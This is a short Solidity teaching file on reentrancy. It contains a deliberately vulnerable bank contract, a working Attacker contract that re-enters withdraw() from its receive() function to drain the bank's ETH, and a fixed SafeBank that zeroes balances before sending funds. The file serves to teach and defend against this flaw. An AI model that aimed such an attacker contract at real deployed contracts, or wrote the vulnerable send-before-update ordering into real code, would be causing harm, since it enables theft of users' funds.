// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

//renetrancy is caused when we update values after for exampleproivding users assets or depositing assets

//to prevent this from happening update blockhain atae data before giving out/back assets or depositing line 22-28 shows the rentrancy mistake

// âŒ VULNERABLE BANK CONTRACT
contract VulnerableBank {
    mapping(address => uint256) public balances;

    // Deposit ETH
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // ðŸš¨ VULNERABLE WITHDRAW - Balance updated AFTER sending ETH
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // DANGER: Sends ETH before updating balance
        // Attacker can call withdraw() again here before balance is zeroed
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");

        // Too late! Attacker already stole everything
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// ðŸ´â€â˜ ï¸ ATTACKER CONTRACT
contract Attacker {
    VulnerableBank public bank;
    uint256 public stolenAmount;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }

    // Start the attack
    function attack() external payable {
        require(msg.value >= 1 ether, "Send at least 1 ETH");

        // 1. Deposit ETH to have a balance
        bank.deposit{value: msg.value}();

        // 2. Call withdraw to start the attack
        bank.withdraw();
    }

    // ðŸ”„ REENTRANCY HAPPENS HERE
    // This is called when bank sends ETH back
    receive() external payable {
        stolenAmount += msg.value;

        // If bank still has money, withdraw AGAIN before first withdraw finishes!
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // ðŸ”„ Re-enter withdraw()
        }
    }

    // Withdraw stolen funds
    function getStolen() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    function getStolenAmount() public view returns (uint256) {
        return stolenAmount;
    }
}

// âœ… SAFE BANK CONTRACT (Fixed version)
contract SafeBank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // âœ… SAFE: Balance updated BEFORE sending ETH
    function withdraw() public {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "No balance");

        // Update balance FIRST (Checks-Effects-Interactions pattern)
        //we update blckchain state beofre we send out money
        balances[msg.sender] = 0;

        // Send ETH AFTER updating state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
